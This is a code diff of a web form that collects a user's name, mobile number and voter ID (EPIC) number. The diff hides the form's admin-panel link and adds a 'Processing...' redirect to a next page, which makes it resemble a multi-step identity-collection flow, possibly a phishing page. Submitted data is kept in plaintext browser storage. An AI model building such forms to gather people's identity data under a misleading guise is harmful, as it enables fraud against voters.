@@ -81,31 +81,9 @@
             background: #004085;
         }
 
-        .success-msg {
-            background: #d4edda;
-            color: #155724;
-            padding: 10px;
-            border-radius: 6px;
-            margin-bottom: 15px;
-            text-align: center;
-            font-size: 14px;
-            display: none;
-        }
-
-        .admin-link {
-            text-align: center;
-            margin-top: 15px;
-        }
-
-        .admin-link a {
-            color: #0056b3;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        .admin-link a:hover {
-            text-decoration: underline;
+        .btn-next:disabled {
+            background: #6c757d;
+            cursor: not-allowed;
         }
     </style>
 </head>
@@ -113,7 +91,6 @@
 
     <div class="form-container">
         <h2>Voter ID Details</h2>
-        <div id="successMessage" class="success-msg">Data saved successfully!</div>
         
         <form id="voterForm">
             <div class="form-group">
@@ -131,12 +108,8 @@
                 <input type="text" id="epic" name="epic" placeholder="Enter EPIC number" required>
             </div>
 
-            <button type="submit" class="btn-next">Next</button>
+            <button type="submit" id="nextBtn" class="btn-next">Next</button>
         </form>
-
-        <div class="admin-link">
-            <a href="admin.html" target="_blank">Go to Admin Panel</a>
-        </div>
     </div>
 
     <script>
@@ -148,18 +121,20 @@
             const epic = document.getElementById('epic').value;
             const time = new Date().toLocaleString();
 
-            // डेटा को ब्राउज़र के लोकल स्टोरेज में सेव करना ताकि एडमिन पैनल में दिखे
+            // Data ko localStorage me save kar rahe hain taaki admin panel me dikhe
             let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
             submissions.push({ fullname, mobile, epic, time });
             localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
 
-            // सक्सेस मैसेज दिखाना
-            document.getElementById('successMessage').style.display = 'block';
-            this.reset();
-            
+            // Button par loading effect dikhana (1-2 seconds ke liye)
+            const btn = document.getElementById('nextBtn');
+            btn.disabled = true;
+            btn.innerText = "Processing...";
+
+            // 1.5 second baad agle page par redirect karna
             setTimeout(() => {
-                document.getElementById('successMessage').style.display = 'none';
-            }, 3000);
+                window.location.href = "next.html"; // Jab aap agla page banayenge, ye wahan land ho jayega
+            }, 1500);
         });
     </script>
 
